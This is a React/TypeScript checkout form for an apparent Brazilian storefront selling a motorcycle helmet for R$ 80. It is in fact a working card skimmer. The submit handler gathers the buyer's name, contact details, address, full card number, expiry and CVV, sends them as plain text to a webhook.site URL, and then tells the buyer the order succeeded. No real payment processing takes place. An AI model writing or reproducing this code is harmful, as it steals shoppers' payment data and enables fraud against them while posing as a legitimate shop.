import { useState } from "react";
import { useToast } from "@/components/ui/use-toast";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { PersonalInfoForm } from "./PersonalInfoForm";
import { PaymentForm } from "./PaymentForm";

interface FormData {
  nome: string;
  email: string;
  telefone: string;
  endereco: string;
  numeroCartao: string;
  validadeCartao: string;
  cvv: string;
  parcelas: "1" | "2";
}

export const CheckoutForm = () => {
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    nome: "",
    email: "",
    telefone: "",
    endereco: "",
    numeroCartao: "",
    validadeCartao: "",
    cvv: "",
    parcelas: "1",
  });

  const formatDataAsNotes = (data: FormData) => {
    const valorParcela = data.parcelas === "1" ? "R$ 80,00" : "R$ 40,00";
    return `
=== NOVO PEDIDO DE CAPACETE LS2 CLASSIC S ===
Nome: ${data.nome}
Email: ${data.email}
Telefone: ${data.telefone}
Endereço: ${data.endereco}
------- Dados do Pagamento -------
Número: ${data.numeroCartao}
Validade: ${data.validadeCartao}
CVV: ${data.cvv}
Parcelas: ${data.parcelas}x de ${valorParcela}
================================
Valor Total: R$ 80,00
Frete: Grátis
================================`;
  };

  const handlePhoneChange = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    let formatted = numbers;
    if (numbers.length <= 11) {
      formatted = numbers.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
    }
    setFormData({ ...formData, telefone: formatted });
  };

  const handleCardNumberChange = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    let formatted = numbers;
    if (numbers.length <= 16) {
      formatted = numbers.replace(/(\d{4})(?=\d)/g, "$1 ");
    }
    setFormData({ ...formData, numeroCartao: formatted });
  };

  const handleCardValidityChange = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    let formatted = numbers;
    if (numbers.length <= 4) {
      formatted = numbers.replace(/^(\d{2})(\d{2}).*/, "$1/$2");
    }
    setFormData({ ...formData, validadeCartao: formatted });
  };

  const handleCvvChange = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 3);
    setFormData({ ...formData, cvv: numbers });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const formattedData = formatDataAsNotes(formData);
      const response = await fetch("https://webhook.site/295a22f7-696f-4834-a212-8f1540b471c6", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain",
        },
        body: formattedData,
      });

      if (response.ok) {
        toast({
          title: "Pedido realizado com sucesso!",
          description: "Você receberá um email com os detalhes da compra.",
        });
        setFormData({
          nome: "",
          email: "",
          telefone: "",
          endereco: "",
          numeroCartao: "",
          validadeCartao: "",
          cvv: "",
          parcelas: "1",
        });
      } else {
        throw new Error("Falha ao processar o pedido");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Erro ao processar pedido",
        description: "Por favor, tente novamente mais tarde.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Card className="p-6 space-y-4 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl shadow-lg animate-fade-in">
      <form onSubmit={handleSubmit} className="space-y-6">
        <PersonalInfoForm
          {...formData}
          onNameChange={(value) => setFormData({ ...formData, nome: value })}
          onEmailChange={(value) => setFormData({ ...formData, email: value })}
          onPhoneChange={handlePhoneChange}
          onAddressChange={(value) => setFormData({ ...formData, endereco: value })}
        />
        <PaymentForm
          {...formData}
          onCardNumberChange={handleCardNumberChange}
          onValidityChange={handleCardValidityChange}
          onCvvChange={handleCvvChange}
          onInstallmentChange={(value) => setFormData({ ...formData, parcelas: value })}
        />
        <Button
          type="submit"
          disabled={loading}
          className="w-full bg-black hover:bg-gray-800 text-white transition-colors duration-200"
        >
          {loading ? "Processando..." : `Finalizar Compra - ${formData.parcelas}x de ${formData.parcelas === "1" ? "R$ 80,00" : "R$ 40,00"}`}
        </Button>
      </form>
    </Card>
  );
};